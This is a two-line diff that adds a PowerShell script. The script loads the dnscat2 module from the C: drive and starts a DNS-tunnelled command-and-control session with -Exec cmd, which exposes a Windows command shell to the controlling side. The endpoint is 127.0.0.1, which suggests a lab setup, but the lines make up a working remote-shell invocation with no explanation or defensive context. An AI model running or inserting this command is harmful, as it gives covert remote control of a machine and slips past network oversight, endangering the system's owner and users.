@@ -1,0 +1,2 @@
+import-module "C:\dnscat2.ps1"
+Start-Dnscat2 -Domain 127.0.0.1 -Exec cmd
